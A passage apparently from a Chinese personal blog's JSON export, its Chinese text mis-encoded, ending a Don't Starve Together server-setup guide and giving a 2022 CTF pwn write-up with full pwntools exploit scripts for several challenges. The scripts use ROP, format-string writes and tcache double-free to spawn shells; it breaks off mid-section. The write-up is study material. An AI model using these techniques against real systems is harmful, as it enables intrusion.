Modï¼ˆå¦‚æœæ²¡æœ‰ä¸‹è½½çš„è¯ï¼‰ï¼Œå¹¶æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚\n\n![image-20221217190311944](https://files.catbox.moe/j350t6.png)\n\næ¥ç€å¯åŠ¨modï¼Œåœ¨`~/.klei/DoNotStarveTogether/Cluster_1/Master`ç›®å½•ä¸‹ï¼Œç¼–è¾‘ `modoverrides.lua` æ–‡ä»¶ä¿å­˜å³å¯ã€‚æ ¼å¼å¦‚ä¸‹ï¼š\n\n```lua\nreturn {\n  [\"workshop-797304209\"]={ configuration_options={  }, enabled=true },\n  [\"workshop-806984122\"]={ configuration_options={  }, enabled=true },\n}\n```\n\né¥¥è’çš„æ¨¡ç»„å¾ˆå¤šï¼Œæ¨èå‡ ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„ï¼ŒæœåŠ¡å™¨æ¨¡ç»„æœ‰æ˜¾ç¤ºé£Ÿç‰©è¡¥å……å€¼ï¼Œæ˜¾ç¤ºåœ°å›¾é˜Ÿå‹ä½ç½®ï¼Œæ˜¾ç¤ºé‡æ€ªè¡€é‡ï¼ŒåŸåœ°å¤æ´»ã€‚\n\nå®¢æˆ·ç«¯æ¨¡ç»„æœ‰ç¦æ­¢å¼¹å‡ºæ¨¡ç»„ä¿¡æ¯å’ŒCombined Statusï¼šæ˜¾ç¤ºçŠ¶æ€ä¿¡æ¯ï¼Œéå¸¸å®ç”¨ï¼\n\n![image-20221217190543967](https://files.catbox.moe/1175wj.png)\n\n# 0x03 æ·»åŠ ç®¡ç†å‘˜\n\né¥¥è’çš„ç®¡ç†å‘˜ä¼šæœ‰ç‰¹æ®Šæ“ä½œæƒé™ï¼Œå¦‚æœåˆ›å»ºè€…ä¸åœ¨è€Œä½ å› ä¸ºç‰¹æ®ŠåŸå› è¦å›æ»šä¸–ç•Œ ï¼Œå°±éœ€è¦è¢«èµ‹äºˆç®¡ç†å‘˜æƒé™æ‰èƒ½æ‰§è¡Œå›é€€ä¸–ç•Œçš„æ“ä½œã€‚\n\n1ã€é¦–å…ˆè·å–è‡ªå·±çš„KLEIç”¨æˆ·IDï¼Œè¿›æ¸¸æˆä¹‹åç‚¹â€œè´¦æˆ·â€å³å¯æŸ¥çœ‹\n\n2ã€åœ¨æœåŠ¡å™¨å­˜æ¡£ä¸‹æ–°å»ºä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œå‘½åä¸º`adminlist.txt`ï¼Œå°†ä½ çš„KLEI`ç”¨æˆ·ID`å†™è¿›å»å°±å¯ä»¥ï¼Œä¿å­˜é€€å‡ºã€‚\n\n# 0x04 å…¶ä»–\n\nè¿è¡Œ `dontstarve_dedicated_server_nullrenderer`ï¼Œè¿˜æœ‰å…¶ä»–çš„å¯åŠ¨å‚æ•°ã€‚ä¸»è¦å‚æ•°å¦‚ä¸‹ï¼š\n\n| å‚æ•°                     | ç”¨æ³•                                                         |\n| :----------------------- | ------------------------------------------------------------ |\n| -persistent_storage_root | æŒ‡å®šå­˜æ¡£æ ¹ç›®å½•çš„ä½ç½®ï¼Œå¿…é¡»æ˜¯ç»å¯¹ç›®å½•ã€‚é»˜è®¤ä¸º `~/.klei`ã€‚     |\n| -conf_dir                | æŒ‡å®šé…ç½®æ–‡ä»¶çš„ç›®å½•åã€‚é»˜è®¤ä¸º `DoNotStarveTogether`ï¼Œå’Œä¸Šä¸€ä¸ªå‚æ•°æ‹¼åœ¨ä¸€èµ·å°±æ˜¯ä½ å­˜æ¡£çš„å®Œæ•´ä½ç½®äº†ï¼Œé»˜è®¤ä¸º `~/.klei/DoNotStarveTogether`ï¼Œæ‰€æœ‰çš„å­˜æ¡£éƒ½åœ¨è¿™é‡Œã€‚ |\n| -cluster                 | æŒ‡å®šå¯åŠ¨çš„ä¸–ç•Œï¼Œé»˜è®¤ä¸º `Cluster_1`ã€‚æœåŠ¡ç«¯å¯åŠ¨æ—¶ä¼šå»æ‰¾ `<persistent_storage_root>/<conf_dir>/<cluster>` ç›®å½•ä¸‹çš„ `cluster.ini` è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ çš„ä¸–ç•Œåç§°ã€å¯†ç ã€æ¸¸æˆæ¨¡å¼ä¹‹ç±»çš„éƒ½æ˜¯åœ¨è¿™é‡Œé…ç½®çš„ï¼ˆç½‘ä¸Šæœ‰äº›æ•™ç¨‹é‡Œç”¨çš„ `setting.ini`ï¼Œé‚£ä¸ªæ˜¯æ—§ç‰ˆçš„ï¼‰ã€‚åŒç†ï¼Œä½ çš„å­˜æ¡£æ–‡ä»¶å¤¹ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ç±»ä¼¼ `Cluster_X` çš„åå­—ï¼Œæ”¹æˆå…¶ä»–ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„éƒ½å¯ä»¥ï¼Œåªè¦å¯åŠ¨æ—¶æŒ‡å®šæœ¬å‚æ•°å°±è¡Œäº†ã€‚ |\n| -shard                   | é»˜è®¤ä¸º `Master`ï¼Œå¯åŠ¨æ—¶å°†æ­¤å‚æ•°æŒ‡å®šä¸º `Cave` å°±å¯ä»¥å¯åŠ¨æ´ç©´æœåŠ¡å™¨ã€‚ |\n\nå¦‚æœæ¸¸æˆæ›´æ–°åï¼ŒæœåŠ¡å™¨DSTä¸æ›´æ–°ä¹Ÿæ— æ³•è¿è¡Œï¼Œæ›´æ–°æ­¥éª¤å¦‚ä¸‹ï¼š\n\n```shell\ncd ~/steamcmd\n./steamcmd.sh\nforce_install_dir ../myDSTserver \nlogin anonymous \napp_update 343050 validate \nquit\n```\n\n# 0x05 å°ç»“\n\nè¿™æ ·å°±å¯ä»¥æ­£å¸¸ç©è€äº†ï¼Œæ€»ä½“è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä¸éœ€è¦å¤ªå¤šçš„æ“ä½œã€‚åæœŸå¦‚æœè¿˜æœ‰è¦æ”¹è¿›çš„åœ°æ–¹å†ç»§ç»­æ¥æ›´æ–°ã€‚\n\n![image-20221227195422183](https://files.catbox.moe/814xew.png)","tags":["DST","GAME"],"categories":["LIFE"]},{"title":"PWNè®°å½•_2022","url":"/2022/12/14/Match22/","content":"\n# å‰è¨€\n\nå†³å®šè€ƒç ”ä¹‹åå‡ ä¹å°±æ²¡åšè¿‡é¢˜äº†ï¼Œï¼Œå·²ç»å›å½’èœé¸¡æ°´å¹³ï¼Œ\n\nå¸Œæœ›è¯»ç ”ä¹‹åèƒ½æŠ½ç©ºåšä¸€åšpwnï¼Œè¿™ç¯‡åšå®¢ç”¨æ¥è®°å½•ç ”ç©¶ç”Ÿä¹‹ååšçš„é¢˜ç›®ï¼Œï¼Œ\n\n## 0x00 MTCTF note\n\nlibc-2.31 ç¼–è¾‘æ—¶ï¼Œidxå¯ä»¥è¾“å…¥è´Ÿæ•°ï¼Œé€šè¿‡éæ³•ç´¢å¼•ä¿®æ”¹åˆ°æ ˆçš„è¿”å›åœ°å€ä¸ºsystem\n\n```c\nint __fastcall sub_4014B6(__int64 a1)\n{\n  int idx; // [rsp+14h] [rbp-Ch]\n  void *buf; // [rsp+18h] [rbp-8h]\n\n  printf(\"Index: \");\n  idx = input();\n  if ( idx > 16 || !*(_QWORD *)(16LL * idx + a1) )\n    return puts(\"Not allowed\");\n  buf = *(void **)(16LL * idx + a1);\n  printf(\"Content: \");\n  return read(0, buf, *(int *)(16LL * idx + a1 + 8));\n}\n```\n\næ³„éœ²libcåŸºå€ï¼Œå…ˆfree7ä¸ªtcacheï¼Œfreeä¸€ä¸ªunsortedbinï¼Œå†ç”³è¯·ä¸€ä¸ªå°å †å—åˆ†å‰²unsortedbinï¼Œäº§ç”Ÿlast_remainderï¼Œåœ¨å°å †å—ä¸­æ®‹ç•™äº†libcåœ°å€å¯ä»¥æ‰“å°ã€‚\n\n### exp\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"5. leave\",\"1\")\n    sla(\"Size:\",str(size))\n    sa(\"Content:\",con)\n\ndef show(idx):\n    sla(\"5. leave\",\"2\")\n    sla(\"Index:\",str(idx))\n\ndef edit(idx,con):\n    sla(\"5. leave\",\"3\")\n    sla(\"Index:\",str(idx))\n    sa(\"Content:\",con)\n\ndef delete(idx):\n    sla(\"5. leave\",\"4\")\n    sla(\"Index:\",str(idx))\n\nfor i in range(9):\n    add(0x100,\"a\")\nfor i in range(8):\n    delete(i)\nadd(0x10,b'a')\nshow(0)\nlibc_base = l64() - 0x1ecc61\ninfo(hex(libc_base))\n\nbin_sh = libc_base + next(libc.search(b'/bin/sh\\x00'))\nsystem = libc_base + libc.sym['system']\ninfo(\"systme:\" + hex(system))\nog = libc_base + 0xe3b34\npop_rdi = 0x00000000004017b3\nret = 0x000000000040101a\n# rop = p64(0xdeadbeef) + p64(og)\nrop = p64(0) + p64(ret) +p64(pop_rdi) + p64(bin_sh)  + p64(system)\ngdb.attach(io)\nedit(-4,rop)\n\nia()\n```\n\n## 0x01 MTCTF æ‰è¿·è—\n\nlibc-2.27 å¤§é‡æ··æ·†æ•°æ®ï¼Œ90%æ²¡ç”¨ï¼Œé‡ç‚¹è§‚å¯Ÿæ ˆä¸­æœ€åä¸€ä¸ªå˜é‡v345ï¼Œæ‰¾åˆ°ç›¸åº”çš„å¾ªç¯ä½“\n\n![image-20221112164039689](https://files.catbox.moe/kryyp2.png)\n\né€å±‚å‘ä¸Šæ‰¾ï¼Œé€†å‡ºé¢˜ç›®é€»è¾‘ï¼Œæœ€åé€šè¿‡æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ã€‚\n\nç‰¹åˆ«è®°å½•çš„ä¸€ç‚¹æ˜¯ï¼Œ  IDAä¸­å¦‚ä¸‹çš„ä»£ç ï¼ŒHIBYTE(), LOBYTE()çš„å«ä¹‰ä¼¼ä¹æœ‰æ­§ä¹‰\n\n```c\nHIBYTE(v95) ^= 0x38u;\nLOBYTE(v98) = v98 ^ 0xC6;\n```\n\nIDAä¸­æ±‡ç¼–æ˜¯`mov byte ptr [rbp+var_374+3], al`ï¼Œå³å–v95çš„æœ€é«˜ä½å­—èŠ‚ï¼ŒLOBYTE()å³å–æœ€ä½å­—èŠ‚ï¼Œè€ŒC/C++ä¸­å¹¶éå¦‚æ­¤ï¼Œtest.cppå¦‚ä¸‹ï¼Œä¸çŸ¥æ˜¯IDAçš„åç¼–è¯‘é—®é¢˜è¿˜æ˜¯...\n\n```c++\n#include <iostream>\n#include <Windows.h>\nint main()\n{\n\t// i = 10241035(0x009c440b)\n\tint i = 10241035;\n\tWORD ih = HIWORD(i);\t// å–é«˜16ä½\n\tWORD il = LOWORD(i);\t// å–ä½16ä½\n \n\t// result: 9c\n\tstd::cout << std::hex << \"ih: \" << ih << std::endl;\n\t// result: 440b\n\tstd::cout << std::hex << \"il: \" << il << std::endl;\n\t\n\tWORD bh = HIBYTE(i);\t// å–é«˜8ä½\n\tWORD bl = LOBYTE(i);\t// å–ä½8ä½\n\t// result: 44\n\tstd::cout << std::hex << \"ih: \" << bh << std::endl;\n\t// result: b\n\tstd::cout << std::hex << \"il: \" << bl << std::endl;\n\treturn EXIT_SUCCESS;\n}\n```\n\n### exp\n\n```python\nio = start()\ndef f():\n    ret = \"\"\n    v104 = [0] * 42\n    z = \"vkyHujGLvgxKsLsXpFvkLqaOkMVwyHXNKZglNEWOKM\"\n    v104[40] = 0x19\n    v104[32] = 0x92\n    v104[14] = 0xA4\n    v104[22] = 0xE6\n    v104[17] = 0x9A\n    v104[1] = 0x7F\n    v104[38] = 0x15\n    v104[0] = 0x3C\n    v104[31] = 0x34\n    v104[30] = 0x2B\n    v104[10] = 0x89\n    v104[26] = 0x98\n    v104[23] = 0xC6\n    v104[21] = 0x68\n    v104[34] = 0x8F\n    v104[25] = 0x5C\n    v104[12] = 0x5C\n    v104[27] = 0xEB\n    v104[35] = 0x42\n    v104[41] = 0xCC\n    v104[6] = 0x49\n    v104[16] = 0xA8\n    v104[7] = 0xA6\n    v104[29] = 0x4E\n    v104[3] = 0xE2\n    v104[13] = 0x31\n    v104[36] = 0x86\n    v104[11] = 0xA7\n    v104[18] = 0x75\n    v104[5] = 1\n    v104[39] = 0xC5\n    v104[9] = 0x93\n    v104[15] = 0x38\n    v104[24] = 0xC6\n    v104[2] = 0xFC\n    v104[20] = 0xC5\n    v104[19] = 0x23\n    v104[37] = 0xEB\n    v104[28] = 0xE0\n    v104[33] = 0x51\n    v104[4] = 0x59\n\n    for i in range(42):\n            ret += chr(v104[i] ^ ord(z[i]))\n\n    return ret\n\nru('sbAmJLMLWm')\nfor i in range(8):\n    sd(\"1 \")\n\nru('HuEqdjYtuWo')\nsd(\"1\"*51)\n\nru(\"hbsoMdIRWpYRqvfClb\")\nsd(\"1\"*53)\n\nru(\"tfAxpqDQuTCyJw\")\nsd(\"1\"*34)\n\nru(\"UTxqmFvmLy\")\nfor i in range(3):\n    sd(\"1 \")\nsd(\"9254 \")\nsd(\"0 \")\nfor i in range(3):\n    sd(\"1 \")\n\nru(\"LLQPyLAOGJbnm\")\nsd(f())\n\nru(\"gRGKqIlcuj\")\nbackdoor = 0x40132C\npayload = b\"1\" * 0x17 +p64(backdoor) +p64(backdoor) + b\"1\" * (55 - 0x17 - 8-8)\nsd(payload)\nio.interactive()\n```\n\n## 0x02 DASCTF2209 cyberprinter\n\nlibc-2.31 ä¿æŠ¤å…¨å¼€ï¼Œé€šè¿‡æ ˆæº¢å‡ºå¯ä»¥æ³„éœ²å‡ºlibcåŸºå€ï¼Œéš¾ç‚¹åœ¨äºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨\n\n```c\nread(0, s, 0x80uLL);\nif ( strchr(s, 'p') || strchr(s, 'P') || strchr(s, 'x') || strchr(s, 'X') )\n{\n    puts(\"bad luck\");\n    exit(-1);\n}\nprintf(s);\nputs(\"\\nWhen you left,hope you can go wherever you want!\");\n```\n\nä¸€æ¬¡fmtstræ¼æ´çš„åˆ©ç”¨ï¼Œè¿›è¡Œåœ°å€ä»»æ„å†™ï¼Œæ— æ³•ä¿®æ”¹gotè¡¨ï¼Œåªèƒ½å¯»æ‰¾libcä¸­å¯ç”¨å¯ä¿®æ”¹çš„å‡½æ•°ã€‚\n\nå…ˆè¯´æœ¬åœ°æµ‹è¯•æˆåŠŸçš„æ˜¯ä¿®æ”¹__strlen_avx2()çš„libcä¸­çš„gotï¼Œé¦–å…ˆè¿›å…¥putså‡½æ•°ï¼Œ\n\n![image-20221110210222122](https://files.catbox.moe/3e24eo.png)\n\nå‘ç°call \\*ABC\\*+0x9f630@pltï¼Œç»§ç»­æ­¥å…¥å‘ç°__strlen_avx2()ï¼Œä¹Ÿå°±æ˜¯è¯´ä¿®æ”¹å…¶æŒ‡é’ˆæŒ‡å‘onegadgetï¼Œå³å¯getshell\n\n![image-20221110210349569](https://files.catbox.moe/qyk5x7.png)\n\nåœ¨libc-2.31.soæ‰¾åˆ°putså‡½æ•°ï¼Œå¯ä»¥æ‰¾åˆ°pltå’Œgotçš„åç§»ï¼Œæ„é€ payloadå³å¯ã€‚\n\n![image-20220920225653497.png](https://files.catbox.moe/odbnxn.png)\n\n### exp\n\n```python\nio = start()\nsla(\"name?pls..\",\"a\"*23)\nlibc_base = l64() - 0x1ed5c0\ninfo(hex(libc_base))\n# system = libc_base + libc.sym['system']\n# start_main = libc_base + 0x21c87\nog = [0xe3afe,0xe3b01,0xe3b04]\none_gadget = libc_base + og[1]\nlibc_atexit = libc_base + 0x01E8898\nrtld = libc_base + 0x22cf68\nstrlen = libc_base + 0x1EC0A8\ntar = rtld\ninfo(\"target: \" + hex(tar))\ninfo(\"one: \" + hex(one_gadget))\npayload = b\"\"\nwritten_size = 0\noffset = 17\n\nfor i in range(6):\n    size = (one_gadget>>(8*i)) & 0xff\n    if(size > (written_size & 0xff)):\n        payload += '%{0}c%{1}$hhn'.format(size-(written_size&0xff),offset+i).encode()\n        written_size += size - (written_size & 0xff)\n    else:\n        payload += '%{0}c%{1}$hhn'.format((0x100-(written_size&0xff))+size,offset+i).encode()\n        written_size += (0x100 - (written_size&0xff)) + size\n\npayload=payload.ljust(0x48,b'a')\nfor i in range(6):\n    payload += p64(tar+i)\n\n# gdb.attach(io)\nsa(\"so you can't do sth\",payload)\n\nio.interactive()\n```\n\nä¸¤æ¬¡å¤±è´¥çš„æ˜¯å°è¯•ä¿®æ”¹__libc_atexitå’Œrtld_lock_default_lock_recursive\n\nrtld_lock_default_lock_recursiveï¼Œå…¶å®šä¹‰äºsysdeps/nptl/libc-lockP.hä¸­ï¼Œå¦‚ä¸‹ï¼š\n\n```c\n#ifdef SHARED\n...\n# define __rtld_lock_lock_recursive(NAME) \\\nGL(dl_rtld_lock_recursive) (&(NAME).mutex)\n\n# define __rtld_lock_unlock_recursive(NAME) \\\nGL(dl_rtld_unlock_recursive) (&(NAME).mutex)\n```\n\nè€Œ__libc_atexitæ˜¯exité‡Œå­˜åœ¨å‡½æ•°æŒ‡é’ˆï¼Œä¸è¯¦ç»†è®°å½•äº†ï¼Œå…·ä½“é€»è¾‘å¯ä»¥åœ¨IDAé‡ŒæŸ¥çœ‹\n\n```c\n RUN_HOOK (__libc_atexit, ());\n```\n\n![image-20221112164122442](https://files.catbox.moe/wue001.png)\n\nä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸï¼Œ__libc_atexitç”šè‡³éƒ½æ²¡æœ‰æ”¹æ‰ï¼Œè¿™é‡ŒæŒ–å‘å…ˆç©ºç€ï¼Œä¹‹åå›å¤´è§£å†³ã€‚\n\n## 0x02 DASCTF2209 appetizer\n\nlibc-2.31 ç¨‹åºå¼€å¯æ²™ç›’å’ŒNXï¼Œé¦–å…ˆé€šè¿‡æ„é€ æ ˆå¸§ç»•è¿‡ç¨‹åºè®¤è¯ï¼Œå†ä½¿ç”¨æ ˆè¿ç§»åŠ ROPä½¿ç”¨ORWè¯»å‡ºflag\n\n```python\nio = start()\nsa(\"Let's check your identity\",b'\\x00\\x00Nameless')\nru(b\"Here you are:0x\")\nend = int(rl().strip(b'\\n'),16)\npie = end - 0x4050\nread_plt = pie + elf.plt['read']\nwrite_plt = pie + elf.plt['write']\nputs_plt = pie + elf.plt['puts']\nputs_got = pie + elf.got['puts']\npop_rdi = pie + 0x00000000000014d3\npop_rsi_r15 = pie + 0x00000000000014d1\nret = pie + 0x000000000000101a\nleave_ret = pie + 0x00000000000012d8\ninfo(hex(end))\n\npayload = p64(pop_rdi) + p64(1)+ p64(pop_rsi_r15) + \\\np64(puts_got) + p64(0) + p64(write_plt) +p64(ret)*21 + p64(pie+0x1428)+\\\np64(end-8) + p64(leave_ret)\npayload = payload.ljust(0xf8,b\"\\x00\")\npayload += b\"flag.txt\"\nsa(\"information on it\",payload)\n\n# gdb.attach(io)\nsa(\"Tell me your wish:\",p64(end-8) + p64(leave_ret))\nlibc_base = l64() - 0x84420\ninfo(hex(libc_base))\nopen_= libc_base + libc.sym['open']\npop_rdx = libc_base + 0x0000000000142c92\npop_rsi = libc_base + 0x000000000002601f\n\npayload = p64(pop_rdi) + p64(end+0xf8)+ p64(pop_rsi) + \\\np64(0) + p64(open_)\npayload += p64(pop_rdi) + p64(3)+ p64(pop_rsi) + \\\np64(end+0x100) + p64(pop_rdx) + p64(0x30) + p64(read_plt)\npayload += p64(pop_rdi) + p64(1)+ p64(write_plt)\n\nsd(payload)\nsl(\"ld1ng\")\nio.interactive()\n```\n\n## 0x03 DASCTF2209 bar\n\nlibc-2.31 libcåŸºå€ç™½ç»™ï¼Œæ¼æ´åœ¨äºdrinkå‡½æ•°æ²¡æœ‰å¯¹å †å—çš„æ£€æŸ¥ï¼Œå¯¼è‡´double freeå’ŒUAF(ä¼¼ä¹æ²¡ç”¨)\n\n```c\n  if ( !*(_QWORD *)list[v1] )\n  {\n    puts(\"run off\");\n    free((void *)list[v1]);\n  }\n```\n\né¦–å…ˆå¡æ»¡tcacheï¼ŒåŠ ä¸¤ä¸ªunsortedbin(åˆå¹¶)ï¼Œå†ç”³è¯·å›ä¸€ä¸ªtcacheï¼Œbouble freeåé¢çš„unsortedbinï¼Œè¿™æ ·unsortedbinå—å°±è¿›å…¥äº†tcacheï¼Œæœ€åç”³è¯·å°å—åˆ†å‰²åˆå¹¶çš„å¤§unsortedbinï¼Œä½¿main_arenaä¸‹ç§»åˆ°tcacheçš„fdæŒ‡é’ˆã€‚æœ€åç”¨drinkå‡½æ•°ä¿®æ”¹main_arenaä¸ºmalloc_hookï¼Œgetshellã€‚\n\n```python\nio = start()\ndef add(op,con):\n    sla(\"Your choice:\",\"1\")\n    sla(\"brandy or Vodka?\",str(op))\n    sa(\"to the waiter:\",con)\ndef free(idx,num):\n    sla(\"Your choice:\",\"2\")\n    sla(\"Which?\",str(idx))\n    sla(\"How much?\",str(num))\n\ndef leak():\n    sla(\"Your choice:\",\"3\")\n    ru(\"0x\")\n    libc_base = int(rl().strip(b'\\n'),16)\n    return libc_base\n\nlibc_base = leak() - 0x1ed6a0\ninfo(hex(libc_base))\ninfo(hex(libc_base + libc.sym['__malloc_hook']))\nogg = one_gadget()\n\nfor i in range(10):\n    add(0,'a')\n\nfor i in range(9):\n    free(i,0x100)\n\nadd(0,'b') #10\nfree(8,0) \nadd(1,'c') #11\nadd(1,'c') #12\nadd(2,'c') #13\n\nfree(8,0x80)\nadd(0,'d')#14\n\nadd(0,p64(ogg[1]))\n# gdb.attach(io\nadd(0,\"test\\n\")\nia()\n```\n\n## 0x04 DASCTF2209 cgrasstring\n\nlibc-2.27.so C++ STLstringç±»çš„resizeå¾ˆç±»ä¼¼reallocï¼Œå¯ä»¥å®ç°freeåŠŸèƒ½ã€‚å½“resizeæ˜¯æ‰©å¤§å½“å‰stringæ—¶ï¼Œä¼šdeletæ‰åŸæ¥çš„stringï¼Œç„¶åæ–°å»ºä¸€ä¸ªã€‚\n\nè°ƒè¯•å‘ç°ï¼ŒåŒç±»å¤§å°å †å—ç”³è¯·åtcacheä¸­ä¼šå…ˆæ”¾å…¥ä¸€ä¸ªåŒå¤§å°çš„å †å—ã€‚å…ˆå¡«æ»¡tcacheï¼Œå†freeä¸€ä¸ªunsortedbinï¼Œç”±äºå­˜åœ¨UAFï¼Œæ‰€ä»¥ç›´æ¥æ‰“å°main_arenaï¼Œæ³„éœ²å‡ºlibcã€‚ç”±äºå†…å®¹resizeæœºåˆ¶ï¼Œä¼šå°†åŸå†…å®¹cpyåˆ°æ–°åœ°å€ï¼Œè€Œchangeçš„å†…å®¹è¿˜æ˜¯ä¼šå†™åˆ°æ—§å †å—ï¼Œæ‰€ä»¥ä¹‹åä¿®æ”¹tcacheçš„fdä¸ºfree_hookï¼Œå°†free_hookæ”¹ä¸ºsystemï¼Œå°†idx8å†…å®¹å†™ä¸º/bin/shï¼Œå½“freeï¼ˆ8ï¼‰æ—¶ï¼Œgetshellã€‚\n\nps:æœ¬åœ°one_gadgetæµ‹è¯•ä¸€ç›´ä¸è¿‡ï¼Œä¸æ¸…æ¥šæƒ…å†µã€‚\n\n```python\nio = start()\ndef add(size,con):\n    sla(\"Your choice:\",\"1\")\n    sla(\"size:\",str(size))\n    sa(\"content:\",con)\n\ndef change(idx,size,con):\n    sla(\"Your choice:\",\"2\")\n    sla(\"idx\",str(idx))\n    sla(\"size\",str(size))\n    sa(\"content\",con)\n\ndef show(idx):\n    sla(\"Your choice:\",\"3\")\n    sla(\"idx\",str(idx))\n\ndef getshell():\n    sla(\"Your choice:\",\"2\")\n    sla(\"idx\",str(8))\n    sla(\"size\",str(0x80))\n\nfor i in range(8):\n    add(0x80,'a')\nfor i in range(1,7):\n    change(i,0x90,'\\xe0')\n\nchange(7,0x90,'\\xe0')\nshow(7)\nlibc_base = l64() - 0x3ebce0\ninfo(hex(libc_base))\nfree_hook = libc_base + libc.sym['__free_hook']\n# malloc_hook = libc_base + libc.sym['__malloc_hook']\ninfo(hex(free_hook))\n# ogg = one_gadget()\n# print(list(map(hex,ogg)))\nsystem = libc_base + libc.sym['system']\nadd(0x20,b'/bin/sh\\x00')\nchange(8,0x30,p64(free_hook))\nadd(0x20,p64(system))\n# gdb.attach(io)\ngetshell()\n\nia()\n```\n\n## 0x05 GKCTF EscapeSH\n\nlibc-2.23ï¼Œé¢˜ç›®æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿshellç¨‹åºï¼Œå¯ä»¥é€†å‘åˆ†æè¿‡ç¨‹ï¼Œæ€»çš„åˆ†ä¸ºæ‰“å°èœå•ï¼Œè·å–è·¯å¾„ï¼Œè¾“å…¥å‘½ä»¤å’Œæ‰§è¡Œå››æ­¥ï¼Œæ¼æ´ç‚¹åœ¨è¾“å…¥å‘½ä»¤æ—¶ï¼Œä¸ºåˆ†å‰²åçš„å‘½ä»¤åˆ†é…å †ï¼Œstrcpyå­˜åœ¨çš„off by nullæ¼æ´ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯IDAä¸­strlen()çš„Cåç¼–è¯‘ä»£ç å½¢å¼å¦‚ä¸‹ã€‚\n\n![image-20221110211242042](https://files.catbox.moe/uuzqxx.png)\n\nå¦å¤–åœ¨monitorå‘½ä»¤ä¸­å­˜åœ¨è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œdl_iterate_phdr((int (*)(struct dl_phdr_info *, size_t, void *))callback, \"EscapeSh\")ï¼Œå‘ç°é‡Œé¢å­˜åœ¨åé—¨å‡½æ•°ã€‚\n\ndl_iterate_phdr() å…è®¸ç¨‹åºè¿­ä»£å®ƒå·²åŠ è½½çš„å…±äº«å¯¹è±¡ã€‚å›è°ƒå‡½æ•°å¯¹æ¯ä¸ªåŠ è½½çš„å…±äº«å¯¹è±¡è°ƒç”¨ä¸€æ¬¡ï¼Œå…è®¸å¯¹æ¯ä¸ªå…±äº«å¯¹è±¡æ‰§è¡Œä¸€ä¸ªæ“ä½œã€‚ callback ä½¿ç”¨ä¸‰ä¸ªå‚æ•°è°ƒç”¨ï¼š \n\n1. æŒ‡å‘åŒ…å«å…±äº«å¯¹è±¡ä¿¡æ¯çš„dl_phdr_infoç±»å‹ç»“æ„çš„æŒ‡é’ˆï¼›\n2. ç»“æ„çš„æ•´æ•°å¤§å°ï¼›\n3. ä»¥åŠdl_iterate_phdr()çš„dataå‚æ•°çš„å‰¯æœ¬ã€‚å¦‚æœå›è°ƒå‡½æ•°è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œ dl_iterate_phdr()å°†åœæ­¢å¤„ç†ï¼Œå³ä½¿æœ‰æœªå¤„ç†çš„å…±äº«å¯¹è±¡ã€‚å¤„ç†é¡ºåºæœªæŒ‡å®šã€‚\n\ndl_phdr_info ç»“æ„\n\n```c\nstruct dl_phdr_info {\nã€€ã€€ElfW(Addr) dlpi_addr;       /* åŸºåœ°å€ */\nã€€ã€€const char* dlpi_name;      /* å¯¹è±¡å */\nã€€ã€€const Elf(Phdr) *dlpi_phdr; /* å¯¹è±¡çš„elfå¤´æ•°ç»„çš„æŒ‡é’ˆ*/\nã€€ã€€ElfW(Half) dlpi_phnum;      /* å¤´çš„æ•°é‡ */\n};\n```\n\n- ElfWå®æ ¹æ®ä¸åŒçš„ç¡¬ä»¶æ¶æ„å®šä¹‰åˆé€‚çš„elfæ•°æ®ç±»å‹,å¦‚32ä½å¹³å°å°±æ˜¯Elf32_Addr.\n- ELF å…±äº«å¯¹è±¡åŒ…å«ä¸€äº›æ•°æ®æ®µï¼Œ æ¯ä¸ªæ®µéƒ½ä¼šæœ‰ä¸ªç¨‹åºå¤´ç»“æ„æ¥æè¿°è¿™ä¸ªæ®µã€‚\n\nElf32_Phdr ï¼š\n\n```c\ntypedef struct {\nElf32_Word p_type;\nElf32_Off p_offset; /* æ®µæ–‡ä»¶åç§» */\nElf32_Addr p_vaddr;\nElf32_Addr p_paddr;\nElf32_Word p_filesz; /* segment size in file*/\nElf32_Word p_memsz; /* æ®µåœ¨å†…å­˜å¤§å° */\nElf32_Word p_flags; /* æ®µæ ‡å¿— */\nElf32_Word p_align; /* æ®µå¯¹é½å€¼*/\n} Elf32_Phdr;\n```\n\nå…¶ä¸­éœ€æŒ‡å‡ºçš„æ˜¯p_memszå¤§äºæˆ–ç­‰äºp_filesz, è¿™æ˜¯å› ä¸ºï¼Œåœ¨å†…å­˜ä¸­çš„æ®µå¯èƒ½ä¼šå­˜åœ¨.bassèŠ‚ï¼Œ ç”±äºè¿™ä¸ªæ”¾åˆ°ç£ç›˜ä¼šå ç”¨ç©ºé—´ï¼Œæ‰€ä»¥åœ¨æ®µåŠ è½½åˆ°å†…å­˜éƒ½ä¼šåŠ ä¸Šã€‚\n\nä¸€ä¸ªå°demo\n\n```c\n#define _GNU_SOURCE\n\n#include <link.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstatic int\ncallback(struct dl_phdr_info *info , size_t size, void*data)\n{\n    int j;\n    printf(\"name: %s (%d segemts)\\n\", info->dlpi_name, info->dlpi_phnum);\n    for( j =0; j< info->dlpi_phnum; j++){\n        printf (\"\\t\\t header %2d: address = %10p\\n\",j,\n        (void*) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr));\n        // Dl_info dlinfo;\n        // dladdr((void*) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr), &dlinfo);\n        // printf(\"\\t %s : %s\\n\", dlinfo.dli_fname, dlinfo.dli_sname);\n\t}\nreturn 0;\n}\n\nint main(int argc, char* argv[]){\ndl_iterate_phdr(callback, NULL);\nexit(EXIT_SUCCESS);\n}\n```\n\n![image-20221110213502442](https://files.catbox.moe/jcyog6.png)\n\næ‰€ä»¥å¯ä»¥é€šè¿‡dl_iterate_phdr 